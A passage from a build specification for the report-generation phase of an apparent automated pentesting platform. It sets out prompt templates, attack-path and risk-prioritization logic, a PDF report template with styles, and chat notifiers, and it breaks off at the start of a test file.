     What can an attacker actually DO with this?
     What does it mean for the business?
     (data loss? compliance violation? downtime?)
     Write for a non-technical reader.
  
  2. TECHNICAL EXPLANATION (2-3 sentences)
     What is the root cause?
     How does the vulnerability work technically?
     Write for a developer.
  
  3. REMEDIATION (3-5 specific steps)
     Exact steps to fix this vulnerability.
     Include code examples if applicable.
     Prioritize by effort vs impact.
  
  Format as JSON:
  {{
    "business_impact": "...",
    "technical_explanation": "...",
    "remediation_steps": ["step1", "step2", "step3"]
  }}
  Return ONLY valid JSON. No markdown. No explanation.
  """

ATTACK_PATH_PROMPT(findings, attack_paths) → str:
  f"""
  You are a red team operator explaining how multiple
  vulnerabilities could be chained together for a
  realistic attack scenario.
  
  AVAILABLE VULNERABILITIES:
  {format_findings_for_chaining(findings)}
  
  IDENTIFIED CHAINS:
  {format_chains(attack_paths)}
  
  Write an ATTACK PATH ANALYSIS covering:
  
  1. Most dangerous realistic attack scenario
     (step by step, from initial access to impact)
  
  2. How vulnerabilities chain together
     (explain A enables B which enables C)
  
  3. Overall attacker capability assessment
     (what could a skilled attacker realistically achieve?)
  
  Write in narrative form. Use numbered steps for attack paths.
  Be realistic — do not exaggerate.
  Maximum 500 words.
  """

REMEDIATION_PLAN_PROMPT(findings) → str:
  f"""
  You are a security consultant creating a remediation
  roadmap for an organization.
  
  FINDINGS TO REMEDIATE:
  {format_findings_by_severity(findings)}
  
  Create a REMEDIATION PLAN with three tiers:
  
  TIER 1 — IMMEDIATE (do within 24-48 hours):
  List findings that pose immediate critical risk.
  For each: specific action to take RIGHT NOW.
  
  TIER 2 — SHORT-TERM (do within 2-4 weeks):
  List high-severity findings to fix this sprint.
  For each: specific remediation steps.
  
  TIER 3 — LONG-TERM (do within 1-3 months):
  List medium/low findings and systemic improvements.
  Include architectural recommendations.
  
  Also include:
  QUICK WINS: Fixes that take < 1 hour and reduce
  risk significantly.
  
  Format as JSON:
  {{
    "immediate": [
      {{"finding": "...", "action": "...", "effort": "..."}}
    ],
    "short_term": [...],
    "long_term": [...],
    "quick_wins": [...]
  }}
  Return ONLY valid JSON. No markdown.
  """

RISK_NARRATIVE_PROMPT(report_data) → str:
  f"""
  You are a CISO writing a risk assessment narrative.
  
  SCAN CONTEXT:
  Target: {report_data.scan.target}
  Risk Score: {report_data.scan.risk_score}/100
  Critical Findings: {report_data.critical_count}
  Attack Surface: {report_data.attack_surface.total_subdomains} assets
  
  Write a RISK ASSESSMENT NARRATIVE (3 paragraphs):
  1. Current risk posture summary
  2. Top 3 risk areas requiring attention
  3. Risk trajectory (will it get better or worse without action?)
  
  Be honest but constructive.
  Use business language, not security jargon.
  """

─────────────────────────────────────────

ai_report_generator.py:

AIContent dataclass:
  executive_summary: str
  risk_narrative: str
  attack_path_analysis: str
  remediation_plan: dict
  finding_analyses: dict[str, FindingAnalysis]

FindingAnalysis dataclass:
  finding_id: str
  business_impact: str
  technical_explanation: str
  remediation_steps: list[str]

AIReportGenerator class:

generate_all(scan_id: str,
             report_data: ReportData) → async → AIContent

  STEP 1: Generate executive summary
    prompt = EXECUTIVE_SUMMARY_PROMPT(report_data)
    summary = await _call_claude(prompt, max_tokens=600)

  STEP 2: Generate finding analyses
    (Only for CRITICAL and HIGH findings — limit AI cost)
    priority_findings = [f for f in report_data.findings
      where f.severity in [CRITICAL, HIGH]][:20]
    
    finding_analyses = {}
    
    For each finding (run sequentially, not parallel):
      prompt = FINDING_ANALYSIS_PROMPT(finding)
      response = await _call_claude(prompt, max_tokens=400)
      
      Try:
        parsed = json.loads(response)
        finding_analyses[str(finding.id)] = FindingAnalysis(
          finding_id=str(finding.id),
          business_impact=parsed["business_impact"],
          technical_explanation=parsed["technical_explanation"],
          remediation_steps=parsed["remediation_steps"]
        )
        
        Update Finding record in DB:
          finding.business_impact = parsed["business_impact"]
          finding.remediation = "\n".join(parsed["remediation_steps"])
          finding.ai_explanation = parsed["technical_explanation"]
      
      Except json.JSONDecodeError:
        Log warning: "AI returned invalid JSON for finding {id}"
        Use fallback text (continue, do not crash)

  STEP 3: Generate attack path analysis
    prompt = ATTACK_PATH_PROMPT(
      report_data.findings,
      report_data.attack_paths
    )
    attack_path_text = await _call_claude(prompt, max_tokens=700)

  STEP 4: Generate remediation plan
    prompt = REMEDIATION_PLAN_PROMPT(report_data.findings)
    remediation_response = await _call_claude(
      prompt, max_tokens=800
    )
    
    Try:
      remediation_plan = json.loads(remediation_response)
    Except:
      remediation_plan = {"error": "AI generation failed",
                          "immediate": [], "short_term": [],
                          "long_term": [], "quick_wins": []}

  STEP 5: Generate risk narrative
    prompt = RISK_NARRATIVE_PROMPT(report_data)
    risk_narrative = await _call_claude(prompt, max_tokens=400)

  Return AIContent(
    executive_summary=summary,
    risk_narrative=risk_narrative,
    attack_path_analysis=attack_path_text,
    remediation_plan=remediation_plan,
    finding_analyses=finding_analyses
  )

_call_claude(prompt: str,
             max_tokens: int) → async → str:
  
  Use httpx AsyncClient:
    POST https://api.anthropic.com/v1/messages
    Headers:
      x-api-key: settings.ANTHROPIC_API_KEY
      anthropic-version: 2023-06-01
      content-type: application/json
    Body:
      {
        "model": "claude-sonnet-4-6",
        "max_tokens": max_tokens,
        "messages": [
          {"role": "user", "content": prompt}
        ]
      }
    timeout = 60s
  
  Extract: response["content"][0]["text"]
  
  On any error (network, API, timeout):
    Log error with details
    Return fallback_text for that section
    NEVER raise exception to caller

fallback(report_data: ReportData) → AIContent:
  Returns AIContent with template text
  when AI calls fail completely:
  
  executive_summary = f"""
  This security assessment of {target} identified
  {total_findings} vulnerabilities across the
  external attack surface. {critical_count} critical
  and {high_count} high severity issues require
  immediate attention. Review the technical findings
  section for detailed remediation guidance.
  """
  
  All other fields = "AI analysis unavailable.
    Please review findings manually."
  
  finding_analyses = {} (empty, fallback used per finding)

Generate both files. Stop after.
```

---

### Step 9.4 — Attack Path Builder

```
PHASE 9 — STEP 4

Generate: backend/reports/attack_path_builder.py

AttackPathBuilder class:

build(scan_id: str,
      findings: list[Finding],
      db: AsyncSession) → async → list[AttackPath]

  Load chain findings from DB:
    chain_findings = [f for f in findings
      where "Chain:" in f.title
      OR "Attack Chain" in f.title]
  
  Also build paths from individual findings:
    individual_paths = _build_from_individual(findings)
  
  All paths = chain_findings paths + individual_paths
  
  Return sorted by severity DESC

_build_from_individual(findings) → list[AttackPath]:

  paths = []
  
  PATH 1: External Recon → Access
    If any subdomain found with admin panel:
    AttackPath(
      title = "External Recon to Unauthorized Access",
      steps = [
        "Attacker discovers admin panel at {url}",
        "Attacker attempts default credentials",
        "If successful: full admin access obtained"
      ],
      severity = HIGH,
      likelihood = MEDIUM,
      findings_involved = [admin_finding]
    )
  
  PATH 2: Credential Exposure → Account Takeover
    If any secret/credential finding exists:
    AttackPath(
      title = "Exposed Credentials to Account Takeover",
      steps = [
        "Attacker discovers exposed {secret_type}",
        "Attacker uses credentials to authenticate",
        "Attacker gains unauthorized access to {service}"
      ],
      severity = CRITICAL,
      likelihood = HIGH,
      findings_involved = [secret_finding]
    )
  
  PATH 3: Public Cloud → Data Exfiltration
    If any S3/Azure/GCP finding exists:
    AttackPath(
      title = "Public Cloud Storage to Data Breach",
      steps = [
        "Attacker enumerates public {cloud} bucket: {url}",
        "Attacker downloads all accessible objects",
        "Data exfiltrated without authentication"
      ],
      severity = CRITICAL if writable else HIGH,
      likelihood = HIGH,
      findings_involved = [cloud_finding]
    )
  
  PATH 4: SQLi → Full Database Compromise
    If SQLi finding exists:
    AttackPath(
      title = "SQL Injection to Database Takeover",
      steps = [
        "Attacker identifies injectable parameter: {param}",
        "Attacker extracts database schema",
        "Attacker dumps all user credentials and PII",
        "Attacker uses credentials for lateral movement"
      ],
      severity = CRITICAL,
      likelihood = HIGH,
      findings_involved = [sqli_finding]
    )
  
  PATH 5: XSS → Session Hijacking → ATO
    If XSS + missing HttpOnly finding:
    AttackPath(
      title = "XSS to Account Takeover Chain",
      steps = [
        "Attacker crafts malicious link with XSS payload",
        "Victim clicks link while logged in",
        "XSS payload executes and exfiltrates session cookie",
        "Attacker uses cookie to hijack victim's account"
      ],
      severity = HIGH,
      likelihood = MEDIUM,
      findings_involved = [xss_finding, cookie_finding]
    )
  
  Return paths

AttackPath dataclass:
  title: str
  description: str
  steps: list[str] (numbered attack steps)
  severity: str
  likelihood: str (HIGH/MEDIUM/LOW)
  findings_involved: list[str] (finding IDs)
  mitre_techniques: list[str]
  business_impact: str

Generate attack_path_builder.py only. Stop after.
```

---

### Step 9.5 — Risk Prioritizer

```
PHASE 9 — STEP 5

Generate: backend/reports/risk_prioritizer.py

RiskPrioritizer class:

prioritize(findings: list[Finding],
           context: dict) → PrioritizedReport

  For each finding calculate priority_score:
    score = _calculate_priority_score(finding, context)
    finding.priority_score = score
  
  Sort findings by priority_score DESC
  
  Group into tiers:
    tier1 = findings where score >= 80 (fix immediately)
    tier2 = findings where score >= 50 (fix this sprint)
    tier3 = findings where score < 50 (fix soon)
  
  Return PrioritizedReport

_calculate_priority_score(finding, context) → float:
  
  score = 0.0
  
  SEVERITY WEIGHT (40 points max):
    CRITICAL → 40
    HIGH → 30
    MEDIUM → 15
    LOW → 5
    INFO → 0
  
  EXPLOITABILITY WEIGHT (25 points max):
    is_confirmed == True → +25
    ai_confidence > 0.8 → +20
    ai_confidence > 0.5 → +10
    has evidence (request + response) → +5
  
  EXPOSURE WEIGHT (20 points max):
    affected_url is public-facing → +20
    is in admin panel → +15
    is in API endpoint → +10
  
  BUSINESS IMPACT WEIGHT (15 points max):
    title contains "credential" or "password" → +15
    title contains "authentication" or "bypass" → +12
    title contains "data" or "exposure" → +10
    title contains "SQL" or "injection" → +10
    title contains "XSS" → +8
    title contains "misconfiguration" → +5
  
  CVSS BONUS:
    cvss_score >= 9.0 → +10
    cvss_score >= 7.0 → +5
  
  Return min(score, 100.0)

generate_quick_wins(findings) → list[Finding]:
  Quick wins = findings where:
    severity in [HIGH, CRITICAL]
    AND title in [
      "Missing Security Headers",
      "Clickjacking",
      "Missing HSTS",
      "SSL/TLS",
      "Debug Mode Enabled",
      "Directory Listing",
      "Default Credentials"
    ]
  
  These are high-impact, low-effort fixes.
  Return sorted by priority_score DESC

PrioritizedReport dataclass:
  tier1: list[Finding] (immediate action)
  tier2: list[Finding] (this sprint)
  tier3: list[Finding] (backlog)
  quick_wins: list[Finding]
  total_findings: int
  estimated_remediation_effort: str
    (calculated as: critical*8h + high*4h + medium*2h)

Generate risk_prioritizer.py only. Stop after.
```

---

### Step 9.6 — PDF Builder

```
PHASE 9 — STEP 6

Generate: backend/reports/pdf_builder.py
          backend/reports/templates/report.html
          backend/reports/templates/styles.css

Generate all 3 files in one response.

─────────────────────────────────────────

pdf_builder.py:

Uses WeasyPrint to render HTML → PDF.
Uses Jinja2 for HTML templating.

PDFBuilder class:

render(report: ReportDocument,
       output_path: str) → async → str:

  STEP 1: Load Jinja2 template
    env = jinja2.Environment(
      loader=jinja2.FileSystemLoader(
        "backend/reports/templates/"
      )
    )
    template = env.get_template("report.html")

  STEP 2: Prepare template context
    context = {
      "report": report,
      "generated_at": report.generated_at,
      "severity_colors": {
        "CRITICAL": "#FF0000",
        "HIGH": "#FF6600",
        "MEDIUM": "#FFB300",
        "LOW": "#4CAF50",
        "INFO": "#2196F3"
      },
      "owasp_colors": { ... color per OWASP category },
      "logo_path": "backend/reports/assets/logo.png"
    }

  STEP 3: Render HTML
    html_content = template.render(**context)
    
    Save HTML for debugging:
      /reports/output/{scan_id}/report_debug.html

  STEP 4: Render PDF with WeasyPrint
    Run in thread pool (WeasyPrint is sync):
      loop = asyncio.get_event_loop()
      await loop.run_in_executor(
        None,
        _render_pdf,
        html_content,
        output_path
      )

_render_pdf(html_content: str, output_path: str) → None:
  from weasyprint import HTML, CSS
  
  HTML(string=html_content).write_pdf(
    output_path,
    stylesheets=[
      CSS(filename="backend/reports/templates/styles.css")
    ],
    presentational_hints=True
  )

─────────────────────────────────────────

report.html template structure:

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>AgentSec AI — Security Assessment Report</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

<!-- PAGE 1: COVER -->
<div class="cover-page">
  <div class="cover-header">
    <div class="logo">AgentSec AI</div>
    <div class="report-type">
      Penetration Testing & Attack Surface Report
    </div>
  </div>
  <div class="cover-body">
    <h1>Security Assessment Report</h1>
    <div class="target-info">
      <div class="info-row">
        <span class="label">Target:</span>
        <span class="value">{{ report.target_info.domain }}</span>
      </div>
      <div class="info-row">
        <span class="label">Scan Date:</span>
        <span class="value">{{ report.scan.started_at }}</span>
      </div>
      <div class="info-row">
        <span class="label">Scan ID:</span>
        <span class="value">{{ report.scan.id }}</span>
      </div>
      <div class="info-row">
        <span class="label">Generated By:</span>
        <span class="value">AgentSec AI v1.0</span>
      </div>
    </div>
    <div class="risk-score-box">
      <div class="risk-label">Overall Risk Score</div>
      <div class="risk-number">
        {{ report.scan.risk_score | round(1) }}/100
      </div>
      <div class="risk-rating">
        {% if report.scan.risk_score >= 80 %}CRITICAL RISK
        {% elif report.scan.risk_score >= 60 %}HIGH RISK
        {% elif report.scan.risk_score >= 40 %}MEDIUM RISK
        {% else %}LOW RISK{% endif %}
      </div>
    </div>
  </div>
  <div class="cover-footer">
    CONFIDENTIAL — For authorized recipients only
  </div>
</div>

<div class="page-break"></div>

<!-- PAGE 2: EXECUTIVE SUMMARY -->
<div class="section">
  <h2 class="section-title">1. Executive Summary</h2>
  
  <div class="findings-overview">
    <div class="severity-box critical">
      <div class="count">{{ report.aggregator.critical_count }}</div>
      <div class="label">Critical</div>
    </div>
    <div class="severity-box high">
      <div class="count">{{ report.aggregator.high_count }}</div>
      <div class="label">High</div>
    </div>
    <div class="severity-box medium">
      <div class="count">{{ report.aggregator.medium_count }}</div>
      <div class="label">Medium</div>
    </div>
    <div class="severity-box low">
      <div class="count">{{ report.aggregator.low_count }}</div>
      <div class="label">Low</div>
    </div>
    <div class="severity-box info">
      <div class="count">{{ report.aggregator.info_count }}</div>
      <div class="label">Info</div>
    </div>
  </div>
  
  <div class="executive-text">
    {{ report.ai_content.executive_summary }}
  </div>
  
  <div class="risk-narrative">
    {{ report.ai_content.risk_narrative }}
  </div>
</div>

<div class="page-break"></div>

<!-- PAGE 3: TARGET INFORMATION -->
<div class="section">
  <h2 class="section-title">2. Target Information</h2>
  <table class="info-table">
    <tr><td>Domain</td>
        <td>{{ report.target_info.domain }}</td></tr>
    <tr><td>IP Address</td>
        <td>{{ report.target_info.ip_address or 'N/A' }}</td></tr>
    <tr><td>Registrar</td>
        <td>{{ report.target_info.registrar or 'N/A' }}</td></tr>
    <tr><td>Hosting Provider</td>
        <td>{{ report.target_info.hosting_provider or 'N/A' }}</td></tr>
    <tr><td>ASN</td>
        <td>{{ report.target_info.asn or 'N/A' }}</td></tr>
    <tr><td>WAF Detected</td>
        <td>{{ report.target_info.waf_name or 'None Detected' }}</td></tr>
    <tr><td>Country</td>
        <td>{{ report.target_info.country or 'N/A' }}</td></tr>
  </table>
</div>

<!-- ATTACK SURFACE SUMMARY -->
<div class="section">
  <h2 class="section-title">3. Attack Surface Summary</h2>
  <div class="stats-grid">
    <div class="stat-card">
      <div class="stat-number">
        {{ report.attack_surface.total_subdomains }}
      </div>
      <div class="stat-label">Subdomains</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">
        {{ report.attack_surface.live_hosts }}
      </div>
      <div class="stat-label">Live Hosts</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">
        {{ report.attack_surface.total_open_ports }}
      </div>
      <div class="stat-label">Open Ports</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">
        {{ report.attack_surface.api_endpoints }}
      </div>
      <div class="stat-label">API Endpoints</div>
    </div>
  </div>
</div>

<!-- TECHNOLOGY STACK -->
<div class="section">
  <h2 class="section-title">4. Technology Stack</h2>
  {% for category, techs in report.tech_stack | groupby('category') %}
  <div class="tech-group">
    <h4>{{ category }}</h4>
    <div class="tech-tags">
      {% for tech in techs %}
      <span class="tech-tag {% if tech.is_outdated %}outdated{% endif %}">
        {{ tech.name }}
        {% if tech.version %} {{ tech.version }}{% endif %}
        {% if tech.is_outdated %} ⚠️{% endif %}
      </span>
      {% endfor %}
    </div>
  </div>
  {% endfor %}
</div>

<div class="page-break"></div>

<!-- VULNERABILITY FINDINGS -->
<div class="section">
  <h2 class="section-title">5. Vulnerability Findings</h2>
  
  {% for finding in report.findings %}
  <div class="finding-card severity-{{ finding.severity | lower }}">
    <div class="finding-header">
      <span class="finding-severity {{ finding.severity | lower }}">
        {{ finding.severity }}
      </span>
      <span class="finding-title">{{ finding.title }}</span>
      {% if finding.cvss_score %}
      <span class="cvss-score">CVSS: {{ finding.cvss_score }}</span>
      {% endif %}
    </div>
    
    <div class="finding-meta">
      {% if finding.cve_id %}
      <span class="meta-tag">{{ finding.cve_id }}</span>
      {% endif %}
      {% if finding.cwe_id %}
      <span class="meta-tag">{{ finding.cwe_id }}</span>
      {% endif %}
      <span class="meta-tag">{{ finding.owasp_category }}</span>
      <span class="meta-tag">{{ finding.tool_found_by }}</span>
    </div>
    
    <div class="finding-url">
      <strong>Affected:</strong> {{ finding.affected_url or 'N/A' }}
    </div>
    
    {% if finding.ai_content %}
    <div class="finding-impact">
      <strong>Business Impact:</strong>
      {{ finding.ai_content.business_impact }}
    </div>
    
    <div class="finding-technical">
      <strong>Technical Details:</strong>
      {{ finding.ai_content.technical_explanation }}
    </div>
    {% else %}
    <div class="finding-description">
      {{ finding.description }}
    </div>
    {% endif %}
    
    {% if finding.evidence %}
    <div class="finding-evidence">
      <strong>Evidence:</strong>
      <pre>{{ finding.evidence[:500] }}</pre>
    </div>
    {% endif %}
    
    {% if finding.ai_content and finding.ai_content.remediation_steps %}
    <div class="finding-remediation">
      <strong>Remediation:</strong>
      <ol>
      {% for step in finding.ai_content.remediation_steps %}
        <li>{{ step }}</li>
      {% endfor %}
      </ol>
    </div>
    {% endif %}
  </div>
  {% endfor %}
</div>

<div class="page-break"></div>

<!-- ATTACK PATH ANALYSIS -->
<div class="section">
  <h2 class="section-title">6. Attack Path Analysis</h2>
  <div class="attack-path-narrative">
    {{ report.ai_content.attack_path_analysis }}
  </div>
  
  {% for path in report.attack_paths %}
  <div class="attack-path-card">
    <h4>{{ path.title }}</h4>
    <div class="path-severity {{ path.severity | lower }}">
      {{ path.severity }}
    </div>
    <ol class="attack-steps">
      {% for step in path.steps %}
      <li>{{ step }}</li>
      {% endfor %}
    </ol>
    <div class="path-impact">{{ path.business_impact }}</div>
  </div>
  {% endfor %}
</div>

<!-- REMEDIATION PLAN -->
<div class="section">
  <h2 class="section-title">7. Remediation Plan</h2>
  
  <div class="remediation-tier tier1">
    <h3>🚨 Tier 1 — Immediate Action (24-48 hours)</h3>
    {% for item in report.ai_content.remediation_plan.immediate %}
    <div class="remediation-item">
      <strong>{{ item.finding }}</strong>
      <p>{{ item.action }}</p>
      <span class="effort">Effort: {{ item.effort }}</span>
    </div>
    {% endfor %}
  </div>
  
  <div class="remediation-tier tier2">
    <h3>⚡ Tier 2 — Short-term (2-4 weeks)</h3>
    {% for item in report.ai_content.remediation_plan.short_term %}
    <div class="remediation-item">
      <strong>{{ item.finding }}</strong>
      <p>{{ item.action }}</p>
    </div>
    {% endfor %}
  </div>
  
  <div class="remediation-tier tier3">
    <h3>📋 Tier 3 — Long-term (1-3 months)</h3>
    {% for item in report.ai_content.remediation_plan.long_term %}
    <div class="remediation-item">{{ item.action }}</div>
    {% endfor %}
  </div>
  
  <div class="quick-wins">
    <h3>⚡ Quick Wins (< 1 hour each)</h3>
    {% for item in report.ai_content.remediation_plan.quick_wins %}
    <div class="quick-win-item">{{ item }}</div>
    {% endfor %}
  </div>
</div>

<!-- SCAN STATISTICS -->
<div class="section">
  <h2 class="section-title">8. Scan Statistics</h2>
  <table class="stats-table">
    <tr><td>Scan Duration</td>
        <td>{{ report.statistics.duration_minutes }} minutes</td></tr>
    <tr><td>Tools Used</td>
        <td>{{ report.statistics.tools_used | join(', ') }}</td></tr>
    <tr><td>Assets Scanned</td>
        <td>{{ report.statistics.assets_scanned }}</td></tr>
    <tr><td>Endpoints Crawled</td>
        <td>{{ report.statistics.endpoints_crawled }}</td></tr>
    <tr><td>Subdomains Found</td>
        <td>{{ report.statistics.subdomains_discovered }}</td></tr>
    {% if report.statistics.fallbacks_used %}
    <tr><td>Fallbacks Triggered</td>
        <td>{{ report.statistics.fallbacks_used | length }}</td></tr>
    {% endif %}
  </table>
</div>

<!-- APPENDIX -->
<div class="section appendix">
  <h2 class="section-title">Appendix A — All Discovered Subdomains</h2>
  <div class="subdomain-list">
    {% for sub in report.appendix.all_subdomains %}
    <span class="subdomain">{{ sub }}</span>
    {% endfor %}
  </div>
  
  <h2 class="section-title">Appendix B — Open Ports</h2>
  <table class="ports-table">
    <thead>
      <tr><th>IP</th><th>Port</th><th>Protocol</th><th>State</th></tr>
    </thead>
    <tbody>
    {% for port in report.appendix.all_open_ports %}
    <tr>
      <td>{{ port.ip }}</td>
      <td>{{ port.number }}</td>
      <td>{{ port.protocol }}</td>
      <td>{{ port.state }}</td>
    </tr>
    {% endfor %}
    </tbody>
  </table>
</div>

<div class="footer">
  Generated by AgentSec AI | {{ report.generated_at }} |
  CONFIDENTIAL
</div>

</body>
</html>

─────────────────────────────────────────

styles.css:

Professional dark-accent PDF stylesheet:

@page {
  size: A4;
  margin: 20mm 15mm 20mm 15mm;
  @bottom-center {
    content: "CONFIDENTIAL — AgentSec AI Report — Page " counter(page);
    font-size: 9px;
    color: #666;
  }
}

body {
  font-family: 'Segoe UI', Arial, sans-serif;
  font-size: 11px;
  color: #1a1a2e;
  line-height: 1.6;
}

.cover-page {
  height: 100vh;
  display: flex;
  flex-direction: column;
  background: linear-gradient(135deg, #0D1117 0%, #1F2937 100%);
  color: white;
  padding: 40px;
}

.cover-header .logo {
  font-size: 32px;
  font-weight: 900;
  color: #1F6FEB;
  letter-spacing: 2px;
}

.risk-score-box {
  border: 3px solid #1F6FEB;
  border-radius: 12px;
  padding: 20px;
  text-align: center;
  margin: 30px auto;
  width: 200px;
}

.risk-number {
  font-size: 48px;
  font-weight: 900;
  color: #FF4444;
}

.section-title {
  font-size: 18px;
  font-weight: 700;
  color: #0D1117;
  border-left: 4px solid #1F6FEB;
  padding-left: 12px;
  margin-bottom: 16px;
}

.finding-card {
  border: 1px solid #e0e0e0;
  border-radius: 8px;
  padding: 16px;
  margin-bottom: 16px;
  page-break-inside: avoid;
}

.finding-card.severity-critical {
  border-left: 5px solid #FF0000;
}

.finding-card.severity-high {
  border-left: 5px solid #FF6600;
}

.finding-card.severity-medium {
  border-left: 5px solid #FFB300;
}

.finding-card.severity-low {
  border-left: 5px solid #4CAF50;
}

.finding-card.severity-info {
  border-left: 5px solid #2196F3;
}

.finding-severity {
  display: inline-block;
  padding: 3px 10px;
  border-radius: 4px;
  font-weight: 700;
  font-size: 10px;
  color: white;
  margin-right: 10px;
}

.finding-severity.critical { background: #FF0000; }
.finding-severity.high { background: #FF6600; }
.finding-severity.medium { background: #FFB300; color: #333; }
.finding-severity.low { background: #4CAF50; }
.finding-severity.info { background: #2196F3; }

.severity-box {
  text-align: center;
  padding: 16px;
  border-radius: 8px;
  display: inline-block;
  width: 80px;
  margin: 0 8px;
}

.severity-box.critical { background: #FFE5E5; color: #CC0000; }
.severity-box.high { background: #FFF0E5; color: #CC5500; }
.severity-box.medium { background: #FFFDE5; color: #996600; }
.severity-box.low { background: #E8F5E9; color: #2E7D32; }
.severity-box.info { background: #E3F2FD; color: #1565C0; }

.severity-box .count { font-size: 32px; font-weight: 900; }
.severity-box .label { font-size: 10px; font-weight: 600; }

.tech-tag {
  display: inline-block;
  background: #EEF2FF;
  color: #3730A3;
  border-radius: 12px;
  padding: 4px 10px;
  font-size: 10px;
  margin: 3px;
}

.tech-tag.outdated {
  background: #FEF2F2;
  color: #991B1B;
}

.finding-evidence pre {
  background: #F3F4F6;
  padding: 10px;
  border-radius: 4px;
  font-size: 9px;
  white-space: pre-wrap;
  word-break: break-all;
}

.attack-path-card {
  background: #FFF8E7;
  border: 1px solid #FDD835;
  border-radius: 8px;
  padding: 16px;
  margin-bottom: 12px;
  page-break-inside: avoid;
}

.remediation-tier {
  margin-bottom: 24px;
}

.remediation-tier.tier1 {
  background: #FFF5F5;
  border: 1px solid #FCA5A5;
  border-radius: 8px;
  padding: 16px;
}

.remediation-tier.tier2 {
  background: #FFFBEB;
  border: 1px solid #FCD34D;
  border-radius: 8px;
  padding: 16px;
}

.quick-wins {
  background: #ECFDF5;
  border: 1px solid #6EE7B7;
  border-radius: 8px;
  padding: 16px;
}

.page-break { page-break-after: always; }

table { width: 100%; border-collapse: collapse; }
th { background: #1F2937; color: white; padding: 8px; font-size: 10px; }
td { padding: 7px 8px; border-bottom: 1px solid #E5E7EB; font-size: 10px; }
tr:nth-child(even) { background: #F9FAFB; }

.footer {
  text-align: center;
  color: #9CA3AF;
  font-size: 9px;
  margin-top: 30px;
  border-top: 1px solid #E5E7EB;
  padding-top: 10px;
}

Generate all 3 files. Stop after.
```

---

### Step 9.7 — Report Notifier

```
PHASE 9 — STEP 7

Generate: backend/workers/processors/report_notifier.py

ReportNotifier class:

send_completion(scan_id: str,
                target: str,
                pdf_path: str,
                summary: dict) → async → None

  risk_level = _get_risk_level(summary["risk_score"])
  emoji = _get_emoji(risk_level)
  
  message_data = {
    "scan_id": scan_id,
    "target": target,
    "risk_score": summary["risk_score"],
    "risk_level": risk_level,
    "critical": summary["critical_count"],
    "high": summary["high_count"],
    "medium": summary["medium_count"],
    "low": summary["low_count"],
    "total": summary["total_findings"],
    "duration": summary["duration_minutes"],
    "report_url": f"/api/v1/reports/{scan_id}/download",
    "emoji": emoji
  }
  
  tasks = []
  
  if settings.SLACK_WEBHOOK_URL:
    tasks.append(_send_slack(message_data))
  
  if settings.TELEGRAM_BOT_TOKEN:
    tasks.append(_send_telegram(message_data))
  
  if settings.DISCORD_WEBHOOK_URL:
    tasks.append(_send_discord(message_data))
  
  results = await asyncio.gather(*tasks, return_exceptions=True)
  
  For each result:
    If is Exception: log warning, continue
  
  Log: "Completion notifications sent for scan {scan_id}"

_send_slack(data) → async:
  color_map = {
    "CRITICAL": "#FF0000",
    "HIGH": "#FF6600",
    "MEDIUM": "#FFB300",
    "LOW": "#36A64F"
  }
  
  message = {
    "attachments": [{
      "color": color_map[data["risk_level"]],
      "pretext": f"{data['emoji']} *AgentSec AI — Scan Complete*",
      "title": f"Security Assessment: {data['target']}",
      "fields": [
        {"title": "Risk Score", "value": f"{data['risk_score']}/100", "short": True},
        {"title": "Risk Level", "value": data["risk_level"], "short": True},
        {"title": "Critical", "value": str(data["critical"]), "short": True},
        {"title": "High", "value": str(data["high"]), "short": True},
        {"title": "Total Findings", "value": str(data["total"]), "short": True},
        {"title": "Duration", "value": f"{data['duration']} min", "short": True},
        {"title": "Report", "value": data["report_url"], "short": False}
      ],
      "footer": "AgentSec AI Autonomous Pentesting Platform"
    }]
  }
  
  POST settings.SLACK_WEBHOOK_URL json=message

_send_telegram(data) → async:
  text = (
    f"{data['emoji']} *AgentSec AI — Scan Complete*\n\n"
    f"*Target:* `{data['target']}`\n"
    f"*Risk Score:* `{data['risk_score']}/100` ({data['risk_level']})\n\n"
    f"*Findings:*\n"
    f"🔴 Critical: {data['critical']}\n"
    f"🟠 High: {data['high']}\n"
    f"🟡 Medium: {data['medium']}\n"
    f"🟢 Low: {data['low']}\n"
    f"📊 Total: {data['total']}\n\n"
    f"⏱ Duration: {data['duration']} minutes\n"
    f"📄 Report: {data['report_url']}"
  )
  
  POST https://api.telegram.org/bot{token}/sendMessage
  json={chat_id, text, parse_mode: "Markdown"}

_send_discord(data) → async:
  color_int = {
    "CRITICAL": 15158332,
    "HIGH": 15756582,
    "MEDIUM": 16776960,
    "LOW": 5763719
  }
  
  embed = {
    "title": f"{data['emoji']} Scan Complete — {data['target']}",
    "color": color_int[data["risk_level"]],
    "fields": [
      {"name": "Risk Score", "value": f"{data['risk_score']}/100", "inline": True},
      {"name": "Risk Level", "value": data["risk_level"], "inline": True},
      {"name": "Critical", "value": str(data["critical"]), "inline": True},
      {"name": "High", "value": str(data["high"]), "inline": True},
      {"name": "Total Findings", "value": str(data["total"]), "inline": True},
      {"name": "Duration", "value": f"{data['duration']} min", "inline": True},
      {"name": "Download Report", "value": data["report_url"], "inline": False}
    ],
    "footer": {"text": "AgentSec AI — Autonomous Pentesting Platform"}
  }
  
  POST settings.DISCORD_WEBHOOK_URL
  json={"embeds": [embed], "username": "AgentSec AI"}

_get_risk_level(score) → str:
  if score >= 80: return "CRITICAL"
  if score >= 60: return "HIGH"
  if score >= 40: return "MEDIUM"
  return "LOW"

_get_emoji(level) → str:
  return {
    "CRITICAL": "🚨",
    "HIGH": "🔴",
    "MEDIUM": "🟡",
    "LOW": "🟢"
  }[level]

Generate report_notifier.py only. Stop after.
```

---

### Step 9.8 — Phase 9 Verification

```
PHASE 9 — STEP 8 — FINAL VERIFICATION

Write tests/test_report_agent.py

Test cases:

1. test_finding_aggregator_counts_correctly
   Insert 2 CRITICAL + 3 HIGH + 5 MEDIUM findings for scan
   Call aggregator.build(scan_id, db)
   Assert: result.critical_count == 2
   Assert: result.high_count == 3
   Assert: result.medium_count == 5
   Assert: result.total_findings == 10

2. test_finding_aggregator_excludes_false_positives
   Insert 5 findings, 2 with is_false_positive=True
   Assert: result.total_findings == 3

3. test_finding_aggregator_separates_secrets
   Insert finding with tool_found_by="trufflehog"
   Assert: finding in result.secret_findings
   Assert: finding NOT in result.findings (main list)

4. test_ai_generator_handles_claude_api_failure
   Mock httpx to raise ConnectionError
